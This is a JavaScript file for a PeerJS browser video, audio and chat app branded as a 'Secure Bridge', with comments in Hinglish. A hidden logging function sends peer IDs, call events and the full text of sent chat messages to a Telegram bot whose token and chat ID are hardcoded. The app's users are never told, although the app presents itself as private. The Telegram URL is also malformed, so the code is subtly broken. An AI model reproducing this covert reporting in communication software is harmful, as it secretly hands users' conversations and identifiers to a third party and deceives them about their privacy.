// Configuration Details
const TELEGRAM_TOKEN = "8816118845:AAGJNkd806IyuYxwpAbu2XGkDRiYaaK75mI";
const CHAT_ID = "7995413659";

// Telegram Alert Function
function logToTelegram(text) {
    fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
    }).catch(e => console.error(e));
}

// PeerJS Initialization (Automatic ID Generation)
const peer = new Peer();
let localStream = null;
let currentCall = null;
let dataConnection = null;

// DOM Elements
const myIdDisplay = document.getElementById('my-id');
const remoteIdInput = document.getElementById('remote-id');
const localVideo = document.getElementById('local-video');
const remoteVideo = document.getElementById('remote-video');
const chatBox = document.getElementById('chatBox');
const msgInput = document.getElementById('msgInput');

// 1. Peer ID generate hone par screen par dikhana aur Telegram par bhejna
peer.on('open', (id) => {
    myIdDisplay.innerText = id;
    logToTelegram(`🌐 *PGN Secure Bridge Live*\n\nNew Node Online!\n*User ID:* \`${id}\``);
});

// 2. Incoming Call Handle Karna (Jab koi aapko call karega)
peer.on('call', (call) => {
    logToTelegram(`🔔 *Incoming Call Alert*\n\nSomeone is calling this node.`);
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then((stream) => {
        localStream = stream;
        localVideo.srcObject = stream;
        call.answer(stream); // Call uthana aur apna camera feed bhejna
        
        call.on('stream', (remoteStream) => {
            remoteVideo.srcObject = remoteStream; // Dusre ka video screen par dikhana
        });
        currentCall = call;
    }).catch(err => alert("Camera/Microphone access denied: " + err));
});

// 3. Incoming Chat Connection Handle Karna
peer.on('connection', (conn) => {
    dataConnection = conn;
    setupChatListeners();
});

// 4. Video Call Lagane ka Function (Button Click)
document.getElementById('video-call-btn').addEventListener('click', () => {
    const targetId = remoteIdInput.value.trim();
    if (!targetId) return alert("Kripya Target User ID dalein!");

    logToTelegram(`📱 *Outgoing Video Call*\n\nCalling ID: \`${targetId}\``);
    
    // Connect Data/Chat
    dataConnection = peer.connect(targetId);
    setupChatListeners();

    // Connect Video/Audio
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then((stream) => {
        localStream = stream;
        localVideo.srcObject = stream;
        const call = peer.call(targetId, stream);
        
        call.on('stream', (remoteStream) => {
            remoteVideo.srcObject = remoteStream;
        });
        currentCall = call;
    }).catch(err => alert("Camera Error: " + err));
});

// 5. Audio Call Lagane ka Function
document.getElementById('audio-call-btn').addEventListener('click', () => {
    const targetId = remoteIdInput.value.trim();
    if (!targetId) return alert("Kripya Target User ID dalein!");

    logToTelegram(`📞 *Outgoing Audio Call*\n\nCalling ID: \`${targetId}\``);
    
    dataConnection = peer.connect(targetId);
    setupChatListeners();

    navigator.mediaDevices.getUserMedia({ video: false, audio: true })
    .then((stream) => {
        localStream = stream;
        const call = peer.call(targetId, stream);
        call.on('stream', (remoteStream) => {
            remoteVideo.srcObject = remoteStream;
        });
        currentCall = call;
    }).catch(err => alert("Audio Error: " + err));
});

// 6. Chat System Setup
document.getElementById('send-btn').addEventListener('click', () => {
    const text = msgInput.value.trim();
    if (text !== "" && dataConnection) {
        dataConnection.send(text); // Dusre user ko bhejna
        appendMessage("You", text, "#00ff00");
        logToTelegram(`📩 *Chat Sent Log*\n\nText: ${text}`);
        msgInput.value = "";
    } else if (!dataConnection) {
        alert("Pehle call ya connect karein tabhi chat chalegi!");
    }
});

function setupChatListeners() {
    dataConnection.on('data', (data) => {
        appendMessage("Peer", data, "#ff00ff");
    });
}

function appendMessage(sender, text, color) {
    let p = document.createElement("p");
    p.style.color = color;
    p.innerText = `${sender}: ${text}`;
    chatBox.appendChild(p);
    chatBox.scrollTop = chatBox.scrollHeight;
}

// 7. Hang Up Button (Call Katna)
document.getElementById('hangup-btn').addEventListener('click', () => {
    if (currentCall) currentCall.close();
    if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
    }
    localVideo.srcObject = null;
    remoteVideo.srcObject = null;
    logToTelegram(`🛑 *Call Disconnected*`);
    alert("Call Ended.");
});

// 8. Hard Delete Chat
document.getElementById('clear-btn').addEventListener('click', () => {
    chatBox.innerHTML = '<p style="color: #888;">System Standby...</p>';
    logToTelegram(`🗑️ *Vault Cleared*`);
});
